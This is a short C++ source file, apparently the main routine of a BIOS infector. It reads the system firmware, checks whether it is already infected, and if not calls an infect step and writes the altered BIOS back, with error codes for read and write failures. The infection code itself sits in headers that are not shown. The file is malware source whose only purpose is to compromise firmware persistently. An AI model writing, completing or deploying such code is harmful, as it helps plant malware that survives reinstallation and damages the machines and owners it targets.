#include "Bios.hpp"
#include "exceptions/BiosNotReadableException.hpp"
#include "exceptions/BiosNotWriteableException.hpp"
#include "logs/LogLevel.hpp"

const int ERROR_CODE_OK = 0;
const int ERROR_CODE_BIOS_NOT_READABLE = -1;
const int ERROR_CODE_BIOS_NOT_WRITEABLE = -2;

int main() {
	int returnValue = ERROR_CODE_OK;
	Log log = Log();
	Bios bios(&log);

	try {
		bios.read();
		if(!bios.isInfected()) {
			bios.infect();
			bios.write();
		}
	} catch (BiosNotReadableException& e) {
		log.printException(INFO, e);
		returnValue = ERROR_CODE_BIOS_NOT_READABLE;
		goto exit;
	} catch (BiosNotWriteableException& e) {
		log.printException(INFO, e);
		returnValue = ERROR_CODE_BIOS_NOT_WRITEABLE;
		goto exit;
	}

	exit:
	return returnValue;
}
